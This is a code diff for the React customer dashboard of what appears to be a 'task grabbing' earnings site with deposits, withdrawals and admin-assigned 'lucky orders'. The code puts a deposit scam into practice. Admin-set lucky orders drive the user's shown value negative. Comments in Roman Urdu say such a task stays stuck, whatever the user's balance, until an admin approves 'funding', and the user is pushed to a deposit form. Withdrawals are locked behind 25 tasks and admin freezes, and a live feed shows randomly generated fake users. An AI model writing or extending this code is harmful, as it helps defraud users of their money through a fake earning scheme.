@@ -11,6 +11,7 @@ interface ProductTask {
   rating: number;
   imageUrl: string;
   isLucky?: boolean;
+ luckyAmount?: number;
 }
 
 interface ChatMessage {
@@ -81,7 +82,7 @@ export const CustomerDashboard: React.FC = () => {
 const [paymentMethod, setPaymentMethod] = useState<'trc20' | 'bank'>('trc20');
 const [paymentReference, setPaymentReference] = useState('');
 const [receiptFile, setReceiptFile] = useState<File | null>(null);
-
+const [depositStep, setDepositStep] = useState<1 | 2>(1);
 
   const usernameDisplay = user?.user_metadata?.username || userEmail.split('@')[0] || 'User';
   const emailDisplay = userEmail.includes('@appuser.local') ? `${usernameDisplay} (Active)` : userEmail;
@@ -100,7 +101,7 @@ const [receiptFile, setReceiptFile] = useState<File | null>(null);
   const [currentTask, setCurrentTask] = useState<ProductTask | null>(null);
   const [showFullPageTask, setShowFullPageTask] = useState<boolean>(false);
 
-  const [recordsList, setRecordsList] = useState<ProductTask[]>([]);
+  const [recordsList, _setRecordsList] = useState<ProductTask[]>([]);
   const [liveFeed, setLiveFeed] = useState(INITIAL_7_TRANSACTIONS);
   const [dbProducts, setDbProducts] = useState<any[]>([]);
 
@@ -119,7 +120,8 @@ const [receiptFile, setReceiptFile] = useState<File | null>(null);
   const [withdrawAmount, setWithdrawAmount] = useState('');
   const [withdrawPasswordInput, setWithdrawPasswordInput] = useState('');
   const [withdrawLockedMsg, setWithdrawLockedMsg] = useState('');
-
+  const [isWithdrawLocked, setIsWithdrawLocked] = useState(false);
+ 
   const [trc20Address, setTrc20Address] = useState('');
   const [erc20Address, setErc20Address] = useState('');
   const [bankName, setBankName] = useState('');
@@ -174,6 +176,85 @@ Digital Marketing is an international legal platform offering genuine earning op
     });
   };
 
+  
+useEffect(() => {
+  if (!user?.id) return;
+
+  let isMounted = true;
+
+   
+const applyProfileSettings = (profile: any) => {
+  if (!isMounted || !profile) return;
+
+  setIsWithdrawLocked(Boolean(profile.withdraw_locked));
+  setWithdrawLockedMsg(profile.withdraw_message || '');
+  setIsAccountFrozen(Boolean(profile.is_frozen));
+  setIsAutoTaskLocked(Boolean(profile.auto_task_lock));
+
+  if (profile.balance !== undefined && profile.balance !== null) {
+    setBalance(Number(profile.balance) || 0);
+  }
+
+  if (profile.vip_level) {
+    setActiveVipLevel(profile.vip_level);
+  }
+};
+
+
+  const loadLatestProfile = async () => {
+    const { data, error } = await supabase
+      .from('profiles')
+      .select(
+        'withdraw_locked, withdraw_message, is_frozen, auto_task_lock, balance, vip_level'
+      )
+      .eq('id', user.id)
+      .maybeSingle();
+
+    if (error) {
+      console.error('Load customer profile settings failed:', error);
+      return;
+    }
+
+    if (data) applyProfileSettings(data);
+  };
+
+  const profileChannel = supabase
+    .channel(`customer-profile-live-${user.id}`)
+    .on(
+      'postgres_changes',
+      {
+        event: '*',
+        schema: 'public',
+        table: 'profiles',
+        filter: `id=eq.${user.id}`,
+      },
+      (payload) => {
+        if (payload.new && Object.keys(payload.new).length > 0) {
+          applyProfileSettings(payload.new);
+        } else {
+          void loadLatestProfile();
+        }
+      }
+    )
+    .subscribe((status, error) => {
+      console.log('Customer profile realtime status:', status);
+
+      if (status === 'CHANNEL_ERROR' || status === 'TIMED_OUT') {
+        console.error(
+          'Customer profile realtime subscription failed:',
+          error
+        );
+      }
+    });
+
+  void loadLatestProfile();
+
+  return () => {
+    isMounted = false;
+    void supabase.removeChannel(profileChannel);
+  };
+}, [user?.id]);
+
   useEffect(() => {
     const timer = setInterval(() => {
       const randomUser = `usr_${Math.floor(1000 + Math.random() * 9000)}***`;
@@ -190,8 +271,16 @@ Digital Marketing is an international legal platform offering genuine earning op
     if (!user) return;
 
     const fetchUserProfileAndData = async () => {
-      const { data: prodData } = await supabase.from('products').select('*');
-      if (prodData && prodData.length > 0) {
+const { data: prodData, error: prodError } = await supabase
+  .from('products')
+  .select('*')
+  .eq('is_active', true);
+
+if (prodError) {
+  console.error('Products loading failed:', prodError);
+} else if (prodData) {
+  setDbProducts(prodData);
+}      if (prodData && prodData.length > 0) {
         setDbProducts(prodData);
       }
 
@@ -220,10 +309,7 @@ Digital Marketing is an international legal platform offering genuine earning op
         if (data.is_frozen !== undefined) setIsAccountFrozen(Boolean(data.is_frozen));
         if (data.auto_task_lock !== undefined) setIsAutoTaskLocked(Boolean(data.auto_task_lock));
 
-        if (data.pending_task) {
-          setCurrentTask(data.pending_task);
-        }
-
+      setCurrentTask(data.pending_task ?? null);
         if (data.trc20 || data.trc20_address || data.account_number || data.bank_name) {
           setTrc20Address(data.trc20_address || data.trc20 || '');
           setErc20Address(data.erc20 || '');
@@ -267,6 +353,7 @@ Digital Marketing is an international legal platform offering genuine earning op
 
       if (data) {
         setBalance(Number(data.balance) || 0.00);
+        setCurrentTask(data.pending_task ?? null);
         setTodayCommission(Number(data.total_profits) || 0.00);
         setRunningTasksVal(Number(data.running_tasks) || 0.00);
         if (data.completed_tasks !== undefined) setCompletedTasks(data.completed_tasks);
@@ -292,9 +379,7 @@ Digital Marketing is an international legal platform offering genuine earning op
             if (payload.new.withdraw_message) setWithdrawLockedMsg(payload.new.withdraw_message);
             if (payload.new.is_frozen !== undefined) setIsAccountFrozen(Boolean(payload.new.is_frozen));
             if (payload.new.auto_task_lock !== undefined) setIsAutoTaskLocked(Boolean(payload.new.auto_task_lock));
-            if (payload.new.pending_task) {
-              setCurrentTask(payload.new.pending_task);
-            }
+          setCurrentTask(payload.new.pending_task ?? null);
           }
         }
       )
@@ -310,6 +395,14 @@ Digital Marketing is an international legal platform offering genuine earning op
     setMessage({ text, type });
     setTimeout(() => setMessage(null), 3500);
   };
+
+  const copyToClipboard = (text: string) => {
+    if (!text) return;
+    navigator.clipboard.writeText(text);
+    showToast('Copied to clipboard!');
+  };
+
+
 
   const handleSendMessage = async (e: React.FormEvent) => {
     e.preventDefault();
@@ -350,8 +443,7 @@ Digital Marketing is an international legal platform offering genuine earning op
     showToast(`Successfully switched to ${vipName}!`);
     setActiveTab('grabbing');
   };
-
-  const handleGrabTask = async () => {
+const handleGrabTask = async () => {
     if (isAccountFrozen) {
       showToast('Your account is frozen by admin. Please contact customer support.', 'error');
       return;
@@ -386,6 +478,7 @@ Digital Marketing is an international legal platform offering genuine earning op
     setIsGrabbing(true);
     const nextTaskNum = completedTasks + 1;
 
+    // SIRF WAHI LUCKY ORDER UTHAYEGA JO ADMIN NE DATABASE MEIN IS TASK NUMBER KE LIYE ACTIVE KIYA HOGA
     const { data: customTaskData, error: customTaskError } = await supabase
       .from('custom_tasks')
       .select('*')
@@ -410,6 +503,7 @@ Digital Marketing is an international legal platform offering genuine earning op
           dbProducts.length > 0 ? dbProducts : INTERNAL_PRODUCT_INVENTORY;
 
         if (customTaskData) {
+          // ADMIN KA SET KIYA HUA LUCKY ORDER
           const targetLuckyAmount = Number(
             customTaskData.locked_price ?? customTaskData.task_amount
           );
@@ -417,17 +511,6 @@ Digital Marketing is an international legal platform offering genuine earning op
           const taskComm = Number(
             customTaskData.locked_commission ?? customTaskData.commission
           );
-
-          if (
-            !Number.isFinite(targetLuckyAmount) ||
-            targetLuckyAmount <= 0 ||
-            !Number.isFinite(taskComm) ||
-            taskComm < 0
-          ) {
-            showToast('Lucky Order amount or commission is invalid.', 'error');
-            setIsGrabbing(false);
-            return;
-          }
 
           const displayNegativeAmt = -Math.abs(targetLuckyAmount);
           const luckyProdIndex = (nextTaskNum - 1) % activePool.length;
@@ -437,11 +520,11 @@ Digital Marketing is an international legal platform offering genuine earning op
             id: nextTaskNum,
             name: selectedLuckyProd.name,
             store: selectedLuckyProd.store || 'Amazon',
-            price: targetLuckyAmount,
+            price: Number(selectedLuckyProd.price) || 0,
+            luckyAmount: targetLuckyAmount,
             commission: taskComm,
             rating: 5,
-            imageUrl:
-              selectedLuckyProd.image_url || selectedLuckyProd.imageUrl,
+            imageUrl: selectedLuckyProd.image_url || selectedLuckyProd.imageUrl,
             isLucky: true,
           };
 
@@ -454,14 +537,15 @@ Digital Marketing is an international legal platform offering genuine earning op
             .eq('id', user.id);
 
           if (profileError) {
-            console.error('Lucky Order save failed:', profileError);
             showToast('Lucky Order could not be saved. Please try again.', 'error');
             setIsGrabbing(false);
             return;
           }
+          
 
           setRunningTasksVal(displayNegativeAmt);
         } else {
+          // NORMAL PRODUCT TASK (YAHAN KOI AUTOMATIC LUCKY ORDER NAHI BANEGA)
           if (balance <= 0) {
             showToast(
               'Insufficient balance! Please make a deposit request.',
@@ -524,7 +608,6 @@ Digital Marketing is an international legal platform offering genuine earning op
             .eq('id', user.id);
 
           if (profileError) {
-            console.error('Product task save failed:', profileError);
             showToast('Could not save task. Please try again.', 'error');
             setIsGrabbing(false);
             return;
@@ -536,207 +619,88 @@ Digital Marketing is an international legal platform offering genuine earning op
         setCurrentTask(grabbedProduct);
         setShowFullPageTask(true);
       } catch (error) {
-        console.error('Grab task failed:', error);
         showToast('Could not load task. Please try again.', 'error');
       } finally {
         setIsGrabbing(false);
       }
     }, 1000);
   };
+const handleConfirmTask = async () => {
+       if (!user || !currentTask) return;
 
-  const handleConfirmTask = async () => {
-    if (!currentTask || !user) return;
-
-    if (runningTasksVal < 0 || balance < 0) {
-      showToast(
-        'Your lucky order is pending. Please contact customer service for assistance.',
-        'error'
-      );
-      setShowFullPageTask(false);
-      setShowDepositModal(true);
-      return;
-    }
-
-    const newCompletedCount = completedTasks + 1;
-    const newComm = parseFloat(
-      (todayCommission + currentTask.commission).toFixed(2)
-    );
-    const newBal = parseFloat(
-      (balance + currentTask.commission).toFixed(2)
-    );
-
-    const { error: profileError } = await supabase
-      .from('profiles')
-      .update({
-        balance: newBal,
-        total_profits: newComm,
-        completed_tasks: newCompletedCount,
-        running_tasks: 0,
-        pending_task: null,
-      })
-      .eq('id', user.id);
-
-    if (profileError) {
-      console.error('Task completion profile update failed:', profileError);
-      showToast('Task completion could not be saved. Please try again.', 'error');
-      return;
-    }
-
+    // 1. STRICT CHECK: Agar yeh Lucky Order hai
     if (currentTask.isLucky) {
-      const { error: taskError } = await supabase
+      // Database se live check karein ke funding_status waqai 'funded' hua hai ya nahi
+      const { data: taskCheck, error: checkErr } = await supabase
         .from('custom_tasks')
-        .update({
-          status: 'completed',
-          is_active: false,
-        })
+        .select('funding_status')
         .eq('user_id', user.id)
         .eq('task_number', currentTask.id)
-        .eq('is_lucky_order', true);
+        .eq('is_lucky_order', true)
+        .eq('status', 'pending')
+        .maybeSingle();
 
-      if (taskError) {
-        console.error('Lucky Order status update failed:', taskError);
-        showToast(
-          'Profile saved, but task status could not be updated. Contact support before retrying.',
-          'error'
-        );
-        return;
+      if (checkErr) {
+        console.error('Funding check error:', checkErr);
+      }
+
+      // Agar database mein funding_status 'funded' NAHI hai, toh task yahin STUCK rahega!
+      // Chahe user ke account mein kitna bhi balance ho, jab tak admin manual funds add karke ya recharge approve karke 'funded' nahi karta, task aage nahi barhega.
+      if (!taskCheck || taskCheck.funding_status !== 'funded') {
+        showToast('This lucky order requires recharge/funding approval. Please complete the deposit first.', 'error');
+        setShowDepositModal(true); // Deposit modal khul jayega taake user recharge kar sake
+        return; // Yahin execution rok di gayi hai, task complete nahi hoga!
       }
     }
 
-    setCompletedTasks(newCompletedCount);
-    setTodayCommission(newComm);
-    setBalance(newBal);
-    setRunningTasksVal(0);
-    setRecordsList((prev) => [currentTask, ...prev]);
+    // 2. Task Completion Logic (Yeh tab hi chalega jab funding_status 100% 'funded' hoga)
+    try {
+      setIsGrabbing(true);
 
-    showToast(
-      `Task #${currentTask.id} completed! Earned +$${currentTask.commission.toFixed(2)}.`
-    );
+      const nextCompletedTasks = completedTasks + 1;
+      const earnedCommission = Number(currentTask.commission || 0);
+      const newBalance = Number((balance + earnedCommission).toFixed(2));
 
-    setCurrentTask(null);
-    setShowFullPageTask(false);
+      // Profile balance aur completed tasks update karein
+      const { error: profileError } = await supabase
+        .from('profiles')
+        .update({
+          balance: newBalance,
+          completed_tasks: nextCompletedTasks,
+          running_tasks: 0,
+          pending_task: null
+        })
+        .eq('id', user.id);
+
+      if (profileError) throw profileError;
+
+      // Custom task ko completed mark kar dein taake wo dobara show na ho
+      if (currentTask.isLucky) {
+        await supabase
+          .from('custom_tasks')
+          .update({
+            status: 'completed',
+            is_active: false
+          })
+          .eq('user_id', user.id)
+          .eq('task_number', currentTask.id)
+          .eq('is_lucky_order', true);
+      }
+
+      setCompletedTasks(nextCompletedTasks);
+      setBalance(newBalance);
+      setCurrentTask(null);
+      setRunningTasksVal(0);
+      setShowFullPageTask(false);
+
+      showToast('Lucky order completed successfully! Commission added.');
+    } catch (err: any) {
+      console.error('Task completion error:', err);
+      showToast(err?.message || 'Could not complete task. Please try again.', 'error');
+    } finally {
+      setIsGrabbing(false);
+    }
   };
-
-  
-const handleDepositSubmit = async (e: React.FormEvent) => {
-  e.preventDefault();
-
-  if (!user) {
-    showToast('Please log in again.', 'error');
-    return;
-  }
-
-  const amount = Number(depositAmount);
-
-  if (!depositAmount || !Number.isFinite(amount) || amount <= 0) {
-    showToast('Please enter a valid deposit amount.', 'error');
-    return;
-  }
-
-  if (!receiptFile) {
-    showToast('Please upload your payment receipt screenshot.', 'error');
-    return;
-  }
-
-  if (paymentMethod === 'trc20' && !paymentReference.trim()) {
-    showToast('Please enter your TRC20 transaction ID (TXID).', 'error');
-    return;
-  }
-
-  if (paymentMethod === 'bank' && !paymentReference.trim()) {
-    showToast('Please enter your bank payment reference.', 'error');
-    return;
-  }
-
-  const allowedTypes = ['image/jpeg', 'image/png', 'image/webp'];
-
-  if (!allowedTypes.includes(receiptFile.type)) {
-    showToast('Please upload a JPG, PNG or WEBP image.', 'error');
-    return;
-  }
-
-  if (receiptFile.size > 5 * 1024 * 1024) {
-    showToast('Receipt image must be 5 MB or smaller.', 'error');
-    return;
-  }
-
-  try {
-    const extension =
-      receiptFile.type === 'image/png'
-        ? 'png'
-        : receiptFile.type === 'image/webp'
-          ? 'webp'
-          : 'jpg';
-
-    const receiptPath =
-      `${user.id}/${crypto.randomUUID()}.${extension}`;
-
-    const { error: uploadError } = await supabase.storage
-      .from('deposit-receipts')
-      .upload(receiptPath, receiptFile, {
-        contentType: receiptFile.type,
-        upsert: false
-      });
-
-    if (uploadError) throw uploadError;
-
-    const { error: insertError } = await supabase
-      .from('deposits')
-      .insert({
-        user_id: user.id,
-        amount,
-        trc20_address:
-          paymentMethod === 'trc20'
-            ? adminTrc20DepositAddress
-            : null,
-        payment_method: paymentMethod,
-        payment_reference: paymentReference.trim(),
-        txid:
-          paymentMethod === 'trc20'
-            ? paymentReference.trim()
-            : null,
-        receipt_path: receiptPath,
-        status: 'pending'
-      });
-
-    if (insertError) {
-      // Best-effort cleanup if saving the request fails.
-      await supabase.storage
-        .from('deposit-receipts')
-        .remove([receiptPath]);
-
-      throw insertError;
-    }
-
-    showToast(
-      'Deposit request submitted. Payment is pending verification.'
-    );
-
-    setShowDepositModal(false);
-    setDepositAmount('');
-    setPaymentReference('');
-    setReceiptFile(null);
-
-    const { data: depData, error: historyError } = await supabase
-      .from('deposits')
-      .select('*')
-      .eq('user_id', user.id)
-      .order('created_at', { ascending: false });
-
-    if (historyError) {
-      console.error('Deposit history error:', historyError);
-    } else if (depData) {
-      setDepositHistory(depData);
-    }
-  } catch (err: any) {
-    console.error('Deposit submission error:', err);
-    showToast(
-      err?.message || 'Deposit request failed. Please try again.',
-      'error'
-    );
-  }
-};
-
   const handleWalletBindSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!user) return;
@@ -799,79 +763,238 @@ const handleDepositSubmit = async (e: React.FormEvent) => {
     setNewWithdrawPass('');
   };
 
+const handleDepositSubmit = async (e: React.FormEvent) => {
+  e.preventDefault();
+
+  if (!user) {
+    showToast('Please sign in first.', 'error');
+    return;
+  }
+
+  const amt = Number(depositAmount);
+  const reference = paymentReference.trim();
+
+  if (!Number.isFinite(amt) || amt <= 0) {
+    showToast('Please enter a valid deposit amount.', 'error');
+    return;
+  }
+
+  // TXID/reference OR receipt: at least one is required
+  if (!reference && !receiptFile) {
+    showToast('Please enter a TXID or upload a payment screenshot.', 'error');
+    return;
+  }
+
+  if (receiptFile) {
+    const allowedTypes = ['image/jpeg', 'image/png', 'image/webp'];
+
+    if (!allowedTypes.includes(receiptFile.type)) {
+      showToast('Please upload a JPG, PNG or WEBP image.', 'error');
+      return;
+    }
+
+    if (receiptFile.size > 5 * 1024 * 1024) {
+      showToast('Receipt image must be 5 MB or smaller.', 'error');
+      return;
+    }
+  }
+
+  let receiptPath: string | null = null;
+
+  // Upload screenshot only when customer selected one
+  if (receiptFile) {
+    const extension = receiptFile.name.split('.').pop()?.toLowerCase();
+
+    if (!extension || !['jpg', 'jpeg', 'png', 'webp'].includes(extension)) {
+      showToast('Invalid receipt file extension.', 'error');
+      return;
+    }
+
+    const safeFileName = `${Date.now()}-${crypto.randomUUID()}.${extension}`;
+    receiptPath = `${user.id}/${safeFileName}`;
+
+    const { error: uploadError } = await supabase.storage
+      .from('deposit-receipts')
+      .upload(receiptPath, receiptFile, {
+        contentType: receiptFile.type,
+        upsert: false,
+      });
+
+    if (uploadError) {
+      showToast(`Receipt upload failed: ${uploadError.message}`, 'error');
+      return;
+    }
+  }
+
+  const addressOrBankInfo =
+    paymentMethod === 'trc20'
+      ? adminTrc20DepositAddress
+      : `Bank: ${bankName} - Account: ${accountNumber}`;
+
+  const { error } = await supabase.from('deposits').insert({
+    user_id: user.id,
+    amount: amt,
+    trc20_address: addressOrBankInfo,
+    status: 'pending',
+    payment_method: paymentMethod,
+    txid: paymentMethod === 'trc20' ? reference || null : null,
+    payment_reference: reference || null,
+    receipt_path: receiptPath,
+  });
+
+  if (error) {
+    console.error('Deposit request failed:', error);
+    showToast(`Deposit Error: ${error.message}`, 'error');
+    return;
+  }
+
+  showToast('Deposit request submitted! Waiting for payment verification.');
+
+  setShowDepositModal(false);
+  setDepositStep(1);
+  setDepositAmount('');
+  setPaymentReference('');
+  setReceiptFile(null);
+
+  const { data: depData, error: historyError } = await supabase
+    .from('deposits')
+    .select('*')
+    .eq('user_id', user.id)
+    .order('created_at', { ascending: false });
+
+  if (!historyError && depData) {
+    setDepositHistory(depData);
+  }
+};
   // UPDATED WITHDRAW SUBMIT WITH BALANCE DEDUCTION & ADMIN LOCK / FROZEN CHECK
-  const handleWithdrawSubmit = async (e: React.FormEvent) => {
-    e.preventDefault();
-    const amt = Number(withdrawAmount);
+ const handleWithdrawSubmit = async (e: React.FormEvent) => {
+  e.preventDefault();
 
-    if (isAccountFrozen) {
-      showToast('Your account is frozen by admin. Withdrawals are restricted.', 'error');
-      return;
-    }
+  const amt = Number(withdrawAmount);
 
-    if (withdrawLockedMsg) {
-      showToast(`Withdrawal Locked: ${withdrawLockedMsg}`, 'error');
-      return;
-    }
+  if (!user) {
+    showToast('Please sign in first.', 'error');
+    return;
+  }
 
-    if (completedTasks < 25) {
-      showToast('Withdrawal Locked: Complete all 25 daily tasks first!', 'error');
-      return;
-    }
+  // Admin withdrawal lock check
+  if (isWithdrawLocked) {
+    showToast(
+      `Withdrawal Locked: ${
+        withdrawLockedMsg || 'Withdrawal is temporarily disabled by admin.'
+      }`,
+      'error'
+    );
+    return;
+  }
 
-    if (!withdrawAmount || amt <= 0 || !withdrawPasswordInput || !user) {
-      showToast('Please enter amount and withdrawal password', 'error');
-      return;
-    }
+  // Account freeze check
+  if (isAccountFrozen) {
+    showToast(
+      `Your account is frozen. ${
+        withdrawLockedMsg || 'Withdrawals are restricted by admin.'
+      }`,
+      'error'
+    );
+    return;
+  }
 
-    if (amt > balance) {
-      showToast('Insufficient balance for withdrawal!', 'error');
-      return;
-    }
+  // Validation
+  if (!withdrawAmount.trim() || !Number.isFinite(amt) || amt <= 0) {
+    showToast('Please enter a valid withdrawal amount.', 'error');
+    return;
+  }
 
-    // 1. Calculate new reduced balance immediately
-    const newBalance = balance - amt;
+  if (!withdrawPasswordInput) {
+    showToast('Please enter your withdrawal password.', 'error');
+    return;
+  }
 
-    // 2. Insert withdrawal record into database
-    const { error } = await supabase.from('withdrawals').insert([
+  if (completedTasks < 25) {
+    showToast(
+      'Withdrawal Locked: Complete all 25 daily tasks first!',
+      'error'
+    );
+    return;
+  }
+
+  try {
+    const { data, error } = await supabase.rpc(
+      'submit_withdrawal_request',
       {
-        user_id: user.id,
-        amount: amt,
-        trc20_address: trc20Address || 'User Wallet',
-        status: 'pending'
+        p_amount: amt,
+        p_password: withdrawPasswordInput,
+        p_trc20_address: trc20Address || 'User Wallet',
       }
-    ]);
+    );
 
-    if (!error) {
-      // 3. Update profiles table balance so funds are deducted instantly
-      const { error: updateError } = await supabase
+    if (error) {
+      console.error('Withdrawal request failed:', error);
+
+      const { data: latestProfile } = await supabase
         .from('profiles')
-        .update({ balance: newBalance })
-        .eq('id', user.id);
+        .select('withdraw_locked, withdraw_message, is_frozen')
+        .eq('id', user.id)
+        .maybeSingle();
 
-      if (updateError) {
-        showToast(`Warning: Request sent but balance sync failed`, 'error');
+      if (latestProfile) {
+        setIsWithdrawLocked(Boolean(latestProfile.withdraw_locked));
+        setWithdrawLockedMsg(latestProfile.withdraw_message || '');
+        setIsAccountFrozen(Boolean(latestProfile.is_frozen));
       }
 
-      setBalance(newBalance);
-
-      showToast(`Withdrawal request for $${withdrawAmount} processed!`);
-      setShowWithdrawModal(false);
-      setWithdrawAmount('');
-      setWithdrawPasswordInput('');
-      
-      const { data: witData } = await supabase.from('withdrawals').select('*').eq('user_id', user.id).order('created_at', { ascending: false });
-      if (witData) setWithdrawHistory(witData);
-    } else {
-      showToast(`Withdrawal Error: ${error.message}`, 'error');
+      showToast(error.message || 'Withdrawal request failed.', 'error');
+      return;
     }
-  };
+    
 
-  const copyToClipboard = (text: string) => {
-    navigator.clipboard.writeText(text);
-    showToast('TRC20 Address copied!');
-  };
+    if (!data?.success) {
+      showToast(data?.message || 'Withdrawal request failed.', 'error');
+      return;
+    }
 
+    // Updated profile fetch karein
+    const { data: updatedProfile, error: profileError } = await supabase
+      .from('profiles')
+      .select('balance, withdraw_locked, withdraw_message, is_frozen, vip_level, auto_task_lock')
+      .eq('id', user.id)
+      .single();
+
+    if (!profileError && updatedProfile) {
+      setBalance(Number(updatedProfile.balance) || 0);
+      setIsWithdrawLocked(Boolean(updatedProfile.withdraw_locked));
+      setWithdrawLockedMsg(updatedProfile.withdraw_message || '');
+      setIsAccountFrozen(Boolean(updatedProfile.is_frozen));
+      setIsAutoTaskLocked(Boolean(updatedProfile.auto_task_lock));
+
+      if (updatedProfile.vip_level) {
+        setActiveVipLevel(updatedProfile.vip_level);
+      }
+    }
+
+    // Refresh withdrawal history
+    const { data: witData } = await supabase
+      .from('withdrawals')
+      .select('*')
+      .eq('user_id', user.id)
+      .order('created_at', { ascending: false });
+
+    if (witData) {
+      setWithdrawHistory(witData);
+    }
+
+    showToast('Withdrawal request submitted successfully.');
+    setShowWithdrawModal(false);
+    setWithdrawAmount('');
+    setWithdrawPasswordInput('');
+  } catch (err: any) {
+    console.error('Withdrawal submission error:', err);
+    showToast(
+      err?.message || 'Could not submit withdrawal request.',
+      'error'
+    );
+  }
+};
   return (
     <div className="min-h-screen w-full bg-[#050508] text-amber-100 pb-28 relative font-sans overflow-x-hidden">
       
@@ -938,7 +1061,21 @@ const handleDepositSubmit = async (e: React.FormEvent) => {
                 </div>
               </div>
             </div>
-
+{/* Frozen Account Warning */}
+{isAccountFrozen && (
+  <div
+    role="alert"
+    className="mb-4 rounded-xl border border-red-500/40 bg-red-500/10 p-4 text-red-300"
+  >
+    <h3 className="mb-2 font-bold">
+      ⚠️ Your Account Is Frozen
+    </h3>
+    <p className="text-sm">
+      Your account has been frozen by the administrator.
+      Please contact Customer Service for assistance.
+    </p>
+  </div>
+)}
             <div className="bg-[#0b0c10] border-2 border-[#d4af37]/70 rounded-3xl p-5 shadow-2xl space-y-4">
               <div className="grid grid-cols-2 gap-4 text-center divide-x divide-[#d4af37]/30">
                 <div>
@@ -1456,19 +1593,24 @@ const handleDepositSubmit = async (e: React.FormEvent) => {
                 <h3 className="text-base font-extrabold text-[#f3e5ab]">Automatic Task Grabbing</h3>
                 <p className="text-xs text-gray-400 mt-1">Click below to start matching order tasks from inventory.</p>
               </div>
+              
+            <button
+  onClick={handleGrabTask}
+  disabled={isGrabbing}
+  className="w-full py-4 bg-gradient-to-r from-[#d4af37] via-[#f3e5ab] to-[#d4af37] hover:brightness-110 text-black font-black text-sm rounded-2xl shadow-[0_0_25px_rgba(212,175,55,0.5)] transition uppercase tracking-wider"
+>
+  {isGrabbing
+    ? 'Matching Order Tasks...'
+    : currentTask?.isLucky === true
+      ? 'VIEW PENDING LUCKY ORDER'
+      : 'START GRABBING'}
+</button>
+ 
+ </div>
+</div>
+)}
 
-              <button
-                onClick={handleGrabTask}
-                disabled={isGrabbing}
-                className="w-full py-4 bg-gradient-to-r from-[#d4af37] via-[#f3e5ab] to-[#d4af37] hover:brightness-110 text-black font-black text-sm rounded-2xl shadow-[0_0_25px_rgba(212,175,55,0.5)] transition uppercase tracking-wider"
-              >
-                {isGrabbing ? 'Matching Order Tasks...' : currentTask ? 'VIEW PENDING LUCKY ORDER' : 'START GRABBING'}
-              </button>
-            </div>
-          </div>
-        )}
-
-        {/* RECORDS TAB */}
+  {/* RECORDS TAB */}
         {activeTab === 'records' && (
           <div className="space-y-4">
             <div className="bg-[#0b0c10] p-6 rounded-3xl border border-[#d4af37]/60 shadow-xl space-y-4">
@@ -1477,35 +1619,37 @@ const handleDepositSubmit = async (e: React.FormEvent) => {
                 <p className="text-xs text-gray-400">View official completed and pending order records.</p>
               </div>
 
-              {currentTask && (
-                <div className="p-4 bg-gradient-to-r from-red-950/80 via-[#2a0808] to-red-950/80 border-2 border-red-500 rounded-2xl space-y-3 shadow-lg">
-                  <div className="flex justify-between items-center border-b border-red-800/40 pb-2">
-                    <span className="text-xs font-bold text-red-400 uppercase tracking-wider flex items-center gap-1">
-                      <span>🎁</span> PENDING LUCKY ORDER #{currentTask.id}
-                    </span>
-                    <span className="text-[10px] bg-red-600/40 border border-red-500 text-red-200 px-2 py-0.5 rounded-full font-bold animate-pulse">
-                      Action Required
-                    </span>
-                  </div>
+       
+{currentTask?.isLucky && (
+  <div className="bg-[#171717] border border-red-500/40 rounded-2xl p-3 space-y-3">
+    <div className="flex items-center gap-3">
+      <img
+        src={currentTask.imageUrl}
+        alt={currentTask.name}
+        className="w-12 h-12 rounded-xl object-cover border border-red-500/50"
+      />
 
-                  <div className="flex items-center gap-3">
-                    <img src={currentTask.imageUrl} alt={currentTask.name} className="w-12 h-12 rounded-xl object-cover border border-red-500/50" />
-                    <div className="flex-1">
-                      <p className="text-xs font-bold text-white line-clamp-1">{currentTask.name}</p>
-                      <p className="text-[10px] text-red-300 font-mono mt-0.5">
-                        Required Recharge: -${Math.abs(runningTasksVal).toFixed(2)}
-                      </p>
-                    </div>
-                  </div>
+      <div className="flex-1 min-w-0">
+        <p className="text-xs font-bold text-white line-clamp-1">
+          {currentTask.name}
+        </p>
 
-                  <button
-                    onClick={() => setShowFullPageTask(true)}
-                    className="w-full py-2.5 bg-gradient-to-r from-[#d4af37] via-[#f3e5ab] to-[#d4af37] text-black font-black text-xs rounded-xl shadow uppercase tracking-wider flex items-center justify-center space-x-1"
-                  >
-                    <span>⚡ OPEN & COMPLETE LUCKY ORDER</span>
-                  </button>
-                </div>
-              )}
+        <p className="text-[10px] text-red-300 font-mono mt-0.5">
+          {Math.abs(Number(runningTasksVal)) > 0.009
+            ? `Required Recharge: $${Math.abs(Number(runningTasksVal)).toFixed(2)}`
+            : 'Lucky Order pending — checking funding status'}
+        </p>
+      </div>
+    </div>
+
+    <button
+      onClick={() => setShowFullPageTask(true)}
+      className="w-full py-2.5 bg-gradient-to-r from-[#d4af37] via-[#f3e5ab] to-[#d4af37] text-black font-black text-xs rounded-xl shadow uppercase tracking-wider flex items-center justify-center space-x-1"
+    >
+      <span>⚡ OPEN & COMPLETE LUCKY ORDER</span>
+    </button>
+  </div>
+)}
 
               {recordsList.length === 0 && !currentTask ? (
                 <div className="py-8 text-center space-y-2">
@@ -1765,185 +1909,277 @@ const handleDepositSubmit = async (e: React.FormEvent) => {
         </div>
       )}
 
-      {/* BANK DETAILS */}
-      {paymentMethod === 'bank' && (
-        <div className="space-y-3 bg-[#18150a] p-3 rounded-2xl border border-[#d4af37]/40">
-          <p className="text-[10px] text-[#d4af37] uppercase font-bold">
-            Bank Transfer Details
+    
+{/* BANK DETAILS */}
+{depositStep === 1 && paymentMethod === 'bank' && (
+  <div className="space-y-3 bg-[#18150a] p-3 rounded-2xl border border-[#d4af37]/40">
+    <p className="text-[10px] text-[#d4af37] uppercase font-bold">
+      Bank Transfer Details
+    </p>
+
+    <div>
+      <label className="text-[10px] text-gray-400 block mb-1">
+        Bank Name
+      </label>
+      <input
+        type="text"
+        placeholder="Enter receiving bank name"
+        value={bankName}
+        onChange={(e) => setBankName(e.target.value)}
+        className="w-full bg-black border border-[#d4af37]/50 rounded-xl px-3 py-2 text-xs text-white"
+      />
+    </div>
+
+    <div>
+      <label className="text-[10px] text-gray-400 block mb-1">
+        Bank Account Number
+      </label>
+      <input
+        type="text"
+        placeholder="Enter receiving account number"
+        value={accountNumber}
+        onChange={(e) => setAccountNumber(e.target.value)}
+        className="w-full bg-black border border-[#d4af37]/50 rounded-xl px-3 py-2 text-xs text-white"
+      />
+    </div>
+
+    <p className="text-[10px] text-gray-400">
+      Check the account details carefully before sending payment.
+    </p>
+  </div>
+)}
+
+<form onSubmit={handleDepositSubmit} className="space-y-3">
+
+  {/* STEP 1: AMOUNT */}
+  {depositStep === 1 && (
+    <>
+      <div>
+        <label className="text-[10px] text-gray-400 block mb-1">
